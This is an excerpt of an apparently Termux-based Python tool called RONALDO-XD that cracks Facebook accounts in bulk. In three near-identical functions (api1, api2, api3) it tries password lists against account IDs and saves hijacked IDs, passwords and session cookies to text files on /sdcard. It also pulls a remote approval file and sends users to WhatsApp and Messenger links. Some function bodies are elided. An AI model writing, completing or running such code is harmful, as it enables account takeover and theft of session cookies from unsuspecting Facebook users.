#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME RONALDO TOOL")
from os import path
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;💚 RONALDO-XD 🥀\x07')
...
myweb2 = requests.get("https://github.com/MRxSPJL/NOBITA-XD/blob/main/lado.txt").text
def apv():
	try:
		clear()
		x = requests.get("https://github.com/MRxSPJL/NOBITA-XD/blob/main/lado.txt").text
		if str("upppdate") in update:
			...
			os.system(f"termux-open-url https://wa.me/+9779816029717?text={kex}")  	
			apv()
...
def Main():
        try:
                        ...
                        print(f'\x1b[38;5;46m➤{A} 1 FILE CRACK\n\x1b[38;5;46m➤{A} 2 JOINT MASSAGER GROUP \n\x1b[38;5;46m➤{A} 3{R} EXIT ')
                        linex()
                        samar=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                        if samar in ['1','01']:
                                ...
                                os.system('xdg-open https://m.me/j/AbZWxp5Ihy6dCATQ/');menu()
                        elif samar in ['0','00']:
                                exit(f'{R}[{G}+{R}]{G} VAK MUGI ')
                        else:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RONALDO-XD-M1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r{R}[{G}RONALDO-XD{R}•{G}OK{R}•{G}💚{R}]{G} '+ids+f' {R}•{G} '+pas+'')
                open('/sdcard/RONALDO-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[RONALDO-XD-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RONALDO-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RONALDO-M2{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                ###print(f'\r\r{R}[RONALDO-XD-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RONALDO-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}RONALDO-XD-M3{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r{R}[{G}RONALDO-XD{R}•{G}OK{R}•{G}💚{R}]{G} '+ids+f' {R}•{G} '+pas+'')
                open('/sdcard/RONALDO-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[RONALDO-XD-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/RONALDO-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
